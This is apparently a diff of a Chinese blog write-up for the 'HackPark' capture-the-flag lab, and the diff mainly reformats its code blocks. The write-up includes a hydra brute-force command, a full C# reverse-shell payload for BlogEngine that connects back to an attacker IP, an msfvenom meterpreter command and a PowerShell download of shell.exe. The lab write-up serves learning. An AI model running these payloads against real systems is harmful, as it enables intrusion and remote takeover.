@@ -26,6 +26,7 @@ windows
 
 ```shell
 Not shown: 998 filtered portsPORT     STATE SERVICE80/tcp   open  http3389/tcp open  ms-wbt-serverMAC Address: 02:E8:E8:78:7F:53 (Unknown)
+
 ```
 
 > 目前使用默认扫描扫出来了两个端口 因此此时需要全端口扫一遍  
@@ -34,7 +35,8 @@ Not shown: 998 filtered portsPORT     STATE SERVICE80/tcp   open  http3389/tcp o
 ##### [](#详细扫描一下80和3389 "详细扫描一下80和3389")详细扫描一下80和3389
 
 ```shell
-80/tcp   open  http           Microsoft IIS httpd 8.53389/tcp open  ms-wbt-server?| ssl-cert: Subject: commonName=hackpark| Not valid before: 2024-05-19T12:37:18|_Not valid after:  2024-11-18T12:37:181 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :SF-Port3389-TCP:V=7.93%I=7%D=5/20%Time=664B470A%P=x86_64-pc-linux-gnu%r(TeSF:rminalServerCookie,13,"\x03\0\0\x13\x0e\xd0\0\0\x124\0\x02\x0f\x08\0\x0SF:2\0\0\0");Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed portDevice type: WAP|phoneRunning: Linux 2.4.X|2.6.X, Sony Ericsson embeddedOS CPE: cpe:/o:linux:linux_kernel:2.4.20 cpe:/o:linux:linux_kernel:2.6.22 cpe:/h:sonyericsson:u8i_vivazOS details: Tomato 1.28 (Linux 2.4.20), Tomato firmware (Linux 2.6.22), Sony Ericsson U8i Vivaz mobile phoneService Info: OS: Windows; CPE: cpe:/o:microsoft:windows## 根据提供的信息，设备类型可能是无线接入点（WAP）或运行Linux 2.4.X或2.6.X的手机，可能带有索尼爱立信的嵌入式技术。具体的操作系统详细信息表明它可能运行着带有Linux 2.4.20或2.6.22的番茄固件，或者是索尼爱立信U8i Vivaz手机。此外，服务信息表明操作系统可能是WindowsTRACEROUTE (using port 3389/tcp)HOP RTT    ADDRESS1   ... 30
+80/tcp   open  http           Microsoft IIS httpd 8.53389/tcp open  ms-wbt-server?| ssl-cert: Subject: commonName=hackpark| Not valid before: 2024-05-19T12:37:18|_Not valid after:  2024-11-18T12:37:181 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :SF-Port3389-TCP:V=7.93%I=7%D=5/20%Time=664B470A%P=x86_64-pc-linux-gnu%r(TeSF:rminalServerCookie,13,"\x03\0\0\x13\x0e\xd0\0\0\x124\0\x02\x0f\x08\0\x0SF:2\0\0\0");Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed portDevice type: WAP|phoneRunning: Linux 2.4.X|2.6.X, Sony Ericsson embeddedOS CPE: cpe:/o:linux:linux_kernel:2.4.20 cpe:/o:linux:linux_kernel:2.6.22 cpe:/h:sonyericsson:u8i_vivazOS details: Tomato 1.28 (Linux 2.4.20), Tomato firmware (Linux 2.6.22), Sony Ericsson U8i Vivaz mobile phoneService Info: OS: Windows;
+CPE: cpe:/o:microsoft:windows## 根据提供的信息，设备类型可能是无线接入点（WAP）或运行Linux 2.4.X或2.6.X的手机，可能带有索尼爱立信的嵌入式技术。具体的操作系统详细信息表明它可能运行着带有Linux 2.4.20或2.6.22的番茄固件，或者是索尼爱立信U8i Vivaz手机。此外，服务信息表明操作系统可能是WindowsTRACEROUTE (using port 3389/tcp)HOP RTT    ADDRESS1   ... 30
 ```
 
 ##### [](#分析一波 "分析一波")分析一波
@@ -62,6 +64,7 @@ web信息收集[边缘资产收集](%E8%BE%B9%E7%BC%98%E8%B5%84%E4%BA%A7%E6%94%B
 
 ```shell
 [19:11:25] Starting:                                                                                                                          [19:11:28] 403 -  312B  - /%2e%2e//google.com                               [19:11:29] 403 -  312B  - /.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd             [19:11:46] 403 -  312B  - /\..\..\..\..\..\..\..\..\..\etc\passwd           [19:11:51] 301 -  152B  - /account  ->  http://10.10.186.107/account/       [19:11:51] 403 -    1KB - /account/                                         [19:11:51] 200 -    4KB - /account/login.aspx                               [19:11:57] 302 -  173B  - /ADMIN  ->  http://10.10.186.107/Account/login.aspx?ReturnURL=/ADMIN[19:11:57] 302 -  173B  - /admin  ->  http://10.10.186.107/Account/login.aspx?ReturnURL=/admin[19:11:57] 302 -  173B  - /Admin  ->  http://10.10.186.107/Account/login.aspx?ReturnURL=/Admin[19:11:59] 302 -  174B  - /Admin/  ->  http://10.10.186.107/Account/login.aspx?ReturnURL=/Admin/[19:11:59] 302 -  174B  - /admin/  ->  http://10.10.186.107/Account/login.aspx?ReturnURL=/admin/[19:12:01] 302 -  179B  - /admin/index  ->  http://10.10.186.107/Account/login.aspx?ReturnURL=/admin/index[19:12:29] 200 -    8KB - /archive                                          [19:12:29] 301 -  158B  - /aspnet_client  ->  http://10.10.186.107/aspnet_client/[19:12:29] 200 -    8KB - /archiver                                         [19:12:29] 200 -    8KB - /archives                                         [19:12:29] 200 -    8KB - /archive.aspx                                     [19:12:30] 403 -    1KB - /aspnet_client/                                   [19:12:40] 403 -  312B  - /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd     [19:12:47] 403 -    1KB - /content/                                         [19:12:47] 301 -  152B  - /content  ->  http://10.10.186.107/content/       [19:12:50] 200 -   13KB - /contact                                          [19:12:50] 200 -   13KB - /contact_us                                       [19:12:50] 200 -   13KB - /contactus                                        [19:12:50] 200 -   13KB - /contacts[19:12:50] 200 -   13KB - /contact.aspx                                     [19:12:50] 403 -    1KB - /custom/                                          [19:12:58] 200 -    7KB - /error.aspx                                       [19:13:01] 301 -  150B  - /fonts  ->  http://10.10.186.107/fonts/           [19:13:28] 302 -  138B  - /page.aspx  ->  http://10.10.186.107/             [19:13:42] 200 -  303B  - /robots.txt                                       [19:13:43] 403 -    1KB - /scripts/                                         [19:13:43] 301 -  152B  - /scripts  ->  http://10.10.186.107/scripts/       [19:13:44] 200 -    8KB - /Search                                           [19:13:44] 200 -    8KB - /search_admin[19:13:44] 200 -    8KB - /search                                           [19:13:44] 200 -    8KB - /search.aspx[19:13:46] 302 -  175B  - /setup  ->  http://10.10.186.107/Account/login.aspx?ReturnUrl=%2fsetup[19:13:46] 302 -  178B  - /setup/  ->  http://10.10.186.107/Account/login.aspx?ReturnUrl=%2fsetup%2f[19:14:00] 200 -    8KB - /Trace.axd  
+
 ```
 
 > 敏感文件泄露可以看到一些
@@ -70,6 +73,7 @@ web信息收集[边缘资产收集](%E8%BE%B9%E7%BC%98%E8%B5%84%E4%BA%A7%E6%94%B
 
 ```text
 User-agent: *Disallow: /Account/*.*Disallow: /searchDisallow: /search.aspxDisallow: /error404.aspxDisallow: /archiveDisallow: /archive.aspx        #Remove the '#' character below and replace example.com with your own website address.#sitemap: http://example.com/sitemap.axd # WebMatrix 1.0
+
 ```
 
 > 翻了一圈其实没啥东西 看到 ammin 之后的登录框 可以看到  
@@ -86,6 +90,7 @@ User-agent: *Disallow: /Account/*.*Disallow: /searchDisallow: /search.aspxDisall
 
 ```shell
 http://10.10.16.159 [200 OK] ASP_NET, Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[Microsoft-IIS/8.5], IP[10.10.16.159], JQuery[1.9.1], Meta-Author[My name], Microsoft-IIS[8.5], OpenSearch[http://10.10.16.159/opensearch.axd], Script[application/ld+json,text/javascript], Title[hackpark | hackpark amusements][Title element contains newline(s)!], UncommonHeaders[content-style-type,content-script-type], X-Powered-By[ASP.NET], X-UA-Compatible[IE=edge]- 网站地址：[http://10.10.16.159](http://10.10.16.159/)- HTTP 状态码：200 OK（表示请求成功）- 使用的技术和框架：[ASP.NET](http://asp.net/)、Bootstrap、HTML5、JQuery- 服务器信息：Microsoft-IIS/8.5- IP 地址：10.10.16.159 IP地址：10.10.16.159- 页面标题：hackpark | hackpark amusements      页面标题：hackpark |哈克公园娱乐- 其他信息：包括元数据作者、脚本类型、支持的搜索引擎、X-Powered-By 等
+
 ```
 
 ### [](#爆破 "爆破")爆破
@@ -114,6 +119,7 @@ http://10.10.16.159 [200 OK] ASP_NET, Bootstrap, Country[RESERVED][ZZ], HTML5, H
 
 ```shell
 hydra -l admin -P /usr/share/wordlists/rockyou.txt -f 10.10.186.107 http-post-form "/Account/login.aspx?ReturnURL=/admin:__VIEWSTATE=NLKCSSa7rclV2%2FJ8EyOkXyn8wneHvwl7dQJm%2F5k0xg14vnrZRR3yYw7300%2FzewSpnKP2BOnx7sIz9YoC7D3eJgxOyPHT3V1yiz8yGJY%2FGkZPGaObOQ8LHHVf5YRUG8vBeAasf8yiMd32SHbczLB0FS5RTLIz%2F7%2FNSX4%2BrBnX0AfLeE4D&__EVENTVALIDATION=Y6aNHuq3ES6mIVhBQu%2Bb7pxm%2Ba%2BIhRRarD55U7J%2F3Vw%2FX0DZ%2BZ%2FRgFI9uJ0350ETBwlg3e8iJ7AUO%2BfXV8DyBt7xudkbAB4R59COT5wR1cdL4ZaS12R08VjEUwaEzsnxPAtyiRokKrfHYC4fUoFSNKpe2vuqrtu2bycn4Q6U3pS2SkZM&ctl00%24MainContent%24LoginUser%24UserName=admin&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=%E7%99%BB%E5%BD%95:Login failed
+
 ```
 
 得到结果
@@ -139,7 +145,52 @@ hydra -l admin -P /usr/share/wordlists/rockyou.txt -f 10.10.186.107 http-post-fo
 不过直接去ex找就可以
 
 ```java
-<%@ Control Language="C#" AutoEventWireup="true" EnableViewState="false" Inherits="BlogEngine.Core.Web.Controls.PostViewBase" %><%@ Import Namespace="BlogEngine.Core" %><script runat="server">	static System.IO.StreamWriter streamWriter;    protected override void OnLoad(EventArgs e) {        base.OnLoad(e);	using(System.Net.Sockets.TcpClient client = new System.Net.Sockets.TcpClient("10.11.69.232", 4444)) {		using(System.IO.Stream stream = client.GetStream()) {			using(System.IO.StreamReader rdr = new System.IO.StreamReader(stream)) {				streamWriter = new System.IO.StreamWriter(stream);										StringBuilder strInput = new StringBuilder();				System.Diagnostics.Process p = new System.Diagnostics.Process();				p.StartInfo.FileName = "cmd.exe";				p.StartInfo.CreateNoWindow = true;				p.StartInfo.UseShellExecute = false;				p.StartInfo.RedirectStandardOutput = true;				p.StartInfo.RedirectStandardInput = true;				p.StartInfo.RedirectStandardError = true;				p.OutputDataReceived += new System.Diagnostics.DataReceivedEventHandler(CmdOutputDataHandler);				p.Start();				p.BeginOutputReadLine();				while(true) {					strInput.Append(rdr.ReadLine());					p.StandardInput.WriteLine(strInput);					strInput.Remove(0, strInput.Length);				}			}		}    	}    }    private static void CmdOutputDataHandler(object sendingProcess, System.Diagnostics.DataReceivedEventArgs outLine) {   	StringBuilder strOutput = new StringBuilder();       	if (!String.IsNullOrEmpty(outLine.Data)) {       		try {                	strOutput.Append(outLine.Data);                    	streamWriter.WriteLine(strOutput);                    	streamWriter.Flush();                } catch (Exception err) { }        }    }</script><asp:PlaceHolder ID="phContent" runat="server" EnableViewState="false"></asp:PlaceHolder>
+<%@ Control Language="C#" AutoEventWireup="true" EnableViewState="false" Inherits="BlogEngine.Core.Web.Controls.PostViewBase" %><%@ Import Namespace="BlogEngine.Core" %><script runat="server">	static System.IO.StreamWriter streamWriter;
+protected override void OnLoad(EventArgs e)
+{
+    base.OnLoad(e);	using(System.Net.Sockets.TcpClient client = new System.Net.Sockets.TcpClient("10.11.69.232", 4444))
+    {
+        using(System.IO.Stream stream = client.GetStream())
+        {
+            using(System.IO.StreamReader rdr = new System.IO.StreamReader(stream))
+            {
+                streamWriter = new System.IO.StreamWriter(stream);
+                StringBuilder strInput = new StringBuilder();
+                System.Diagnostics.Process p = new System.Diagnostics.Process();
+                p.StartInfo.FileName = "cmd.exe";
+                p.StartInfo.CreateNoWindow = true;
+                p.StartInfo.UseShellExecute = false;
+                p.StartInfo.RedirectStandardOutput = true;
+                p.StartInfo.RedirectStandardInput = true;
+                p.StartInfo.RedirectStandardError = true;
+                p.OutputDataReceived += new System.Diagnostics.DataReceivedEventHandler(CmdOutputDataHandler);
+                p.Start();
+                p.BeginOutputReadLine();
+                while(true)
+                {
+                    strInput.Append(rdr.ReadLine());
+                    p.StandardInput.WriteLine(strInput);
+                    strInput.Remove(0, strInput.Length);
+                }
+            }
+        }
+    }
+}
+private static void CmdOutputDataHandler(object sendingProcess, System.Diagnostics.DataReceivedEventArgs outLine)
+{
+    StringBuilder strOutput = new StringBuilder();
+    if (!String.IsNullOrEmpty(outLine.Data))
+    {
+        try {
+            strOutput.Append(outLine.Data);
+            streamWriter.WriteLine(strOutput);
+            streamWriter.Flush();
+        }
+        catch (Exception err)
+        {
+        }
+    }
+}</script><asp:PlaceHolder ID="phContent" runat="server" EnableViewState="false"></asp:PlaceHolder>
 ```
 
 根据exp的指示找到编辑器页面  
@@ -164,6 +215,7 @@ windows机器
 
 ```shell
 ### 生成exe msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai  LHOST=IP LPORT=PORT -f exe -o shell-name.exe
+
 ```
 
 > \*\*\*架设http服务 是的目标靶机可以获取 响应的exe 文件
@@ -172,6 +224,7 @@ windows机器
 
 ```powershell
 下载:powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.11.69.232/shell.exe','shell.exe')"之后直接下载但是要保证一直在运行才能 获得持续的 shell运行就可以得到一个meterpreter 哦对还要打开 msf 的handler 进行一个监听
+
 ```
 
 ![image.png](https://raw.githubusercontent.com/k1t0111/blog/main/image/20240529193624.png)
@@ -195,6 +248,7 @@ msf后渗透模块
 
 ```shell
  upload /home/tom/get_power/windows/winPEASx86.exe /Windows/Temp/winpeas.exe[*] Uploading  : /home/tom/get_power/windows/winPEASx86.exe -> /Windows/Temp/winpeas.exe
+
 ```
 
 > 可以看到 服务
